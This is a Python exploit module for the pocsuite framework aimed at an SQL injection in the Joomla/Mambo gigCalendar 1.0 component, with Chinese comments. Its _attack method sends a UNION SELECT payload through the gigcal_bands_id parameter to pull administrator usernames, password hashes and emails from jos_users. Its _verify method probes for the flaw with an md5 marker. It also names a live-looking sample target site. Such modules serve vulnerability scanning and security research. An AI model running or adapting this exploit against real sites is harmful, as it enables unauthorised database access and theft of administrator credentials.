#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '86077'  # ssvid
    version = '1.0'
    author = ['kikay']
    vulDate = '2009-02-24'
    createDate = '2016-01-20'
    updateDate = '2016-01-20'
    references = ['http://www.sebug.net/vuldb/ssvid-86077']
    name = 'Joomla! and Mambo gigCalendar Component 1.0 &#39;banddetails.php&#39; SQL Injection Vulnerability'
    appPowerLink = 'http://www.joomla.org'
    appName = 'Joomla! and Mambo gigCalendar Component'
    appVersion = '1.0'
    vulType = 'SQL Injection'
    desc = '''
        gigCalendar是一个免费的为维护网站旅游日志的的Joomla! and Mambo组件。
        Mambo和Joomla! GigCalendar (com_gigcal)组件中存在多个SQL注入漏洞,当magic_quotes_gpc被中止时，远程攻击者
        (1)可以借助对index.php的一个细节操作的gigcal _venues_id参数，且该参数没有经过venuedetails.php适当地处理，以执行任意SQL指令；
        (2)借助对index.php的一个细节操作中igcal_bands_id参数，且该参数没有经过banddetails.php适当地处理，以执行任意SQL命令。

        利用的POC格式是：http://XXX.com/index.php?option=com_gigcal&task=details&gigcal_bands_id=-1'
            UNION ALL SELECT 1,2,3,4,5,md5(1),NULL,NULL,NULL,NULL,NULL,NULL,NULL%23
    '''
    samples = ['http://www.semion.com.sg']

    def _attack(self):
        #利用SQL注入读取joomla管理员信息
        result = {}
        #访问的地址
        exploit='/index.php?option=com_gigcal&task=details&gigcal_bands_id='
        #利用Union方式读取信息
        payload="-1' UNION ALL SELECT 1,2,3,4,5,concat(0x247e7e7e24,username,"\
        "0x2a2a2a,password,0x2a2a2a,email,0x247e7e7e24),NULL,NULL,NULL,NULL,NULL,NULL,NULL from jos_users%23"
        #构造漏洞利用连接
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #提取信息的正则表达式
        parttern='\$~~~\$(.*)\*\*\*(.*)\*\*\*(.*)\$~~~\$'
        #发送请求
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查是否含有特征字符串
        if '$~~~$' in resp.content:
            #提取信息
            match=re.search(parttern,resp.content,re.M|re.I)
            if match:
                #漏洞利用成功
                result['AdminInfo']={}
                #用户名
                result['AdminInfo']['Username']=match.group(1)
                #密码
                result['AdminInfo']['Password']=match.group(2)
                #邮箱
                result['AdminInfo']['Email']=match.group(3)
        return self.parse_output(result)

    def _verify(self):
        #通过计算md5(3.1415)的值，来验证SQL注入
        result = {}
        #访问的地址
        exploit='/index.php?option=com_gigcal&task=details&gigcal_bands_id='
        #利用union的方式（计算md5(3.1415)）
        payload="-1' UNION ALL SELECT 1,2,3,4,5,md5(3.1415),NULL,NULL,NULL,NULL,NULL,NULL,NULL%23"
        #构造漏洞利用连接
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #发送请求
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查是否含有特征字符串(md5(3.1415)=63e1f04640e83605c1d177544a5a0488)
        if '63e1f04640e83605c1d177544a5a0488' in resp.content:
            #漏洞验证成功
            result['VerifyInfo']={}
            result['VerifyInfo']['URL'] = self.url+exploit
            result['VerifyInfo']['Payload'] = payload
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)